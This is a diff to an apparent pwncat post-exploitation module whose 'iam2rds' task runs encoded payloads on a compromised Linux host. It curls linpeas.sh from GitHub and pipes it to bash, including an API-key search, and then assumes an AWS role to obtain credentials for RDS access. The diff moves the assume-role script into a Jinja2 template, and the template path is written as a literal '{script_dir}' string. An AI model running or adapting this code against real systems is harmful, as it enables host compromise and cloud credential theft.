@@ -5,6 +5,7 @@ from pwncat import util
 from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
 from pwncat.manager import Session
 from pwncat.platform.linux import Linux
+from jinja2 import Environment, FileSystemLoader
 from pathlib import Path
 import subprocess
 import shutil
@@ -40,6 +41,10 @@ class Module(BaseModule):
                 session.log(f"error: {e}")
         elif task_name == "iam2rds":
             try:
+                session.log("setting up templates directory: {script_dir}/../resources")
+                file_loader = FileSystemLoader('{script_dir}/../resources')
+                env = Environment(loader=file_loader)
+
                 # run host enumeration
                 payload = base64.b64encode(b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt')
                 session.log("payload loaded and ready")
@@ -47,14 +52,12 @@ class Module(BaseModule):
                 session.log(result)
 
                 # run a local assume role...not ideal
-                payload = base64.b64encode(b'''
-                ROLE_NAME="rds_user_access_role_ciemdemo"
-                SESSION_NAME="khon.traktour@interlacelabs"
-                AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')
-                echo "Account Number: $AWS_ACCOUNT_NUMBER"
-                CREDS=$(aws sts assume-role --role-arn "arn:aws:iam::$AWS_ACCOUNT_NUMBER:role/$ROLE_NAME" --role-session-name="$SESSION_NAME")
-                echo "Assume Role Creds: $CREDS"
-                ''')
+                template = env.get_template('iam2rds_assumerole.sh')
+                output = template.render({
+                    'role_name' : '${iam2rds_role_name}' ,
+                    'session_name' : '${iam2rds_session_name}'
+                })
+                payload = base64.b64encode(output.encode('utf-8'))
                 session.log("payload loaded and ready")
                 result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_assumerole | base64 -d | /bin/bash'")
                 session.log(result)
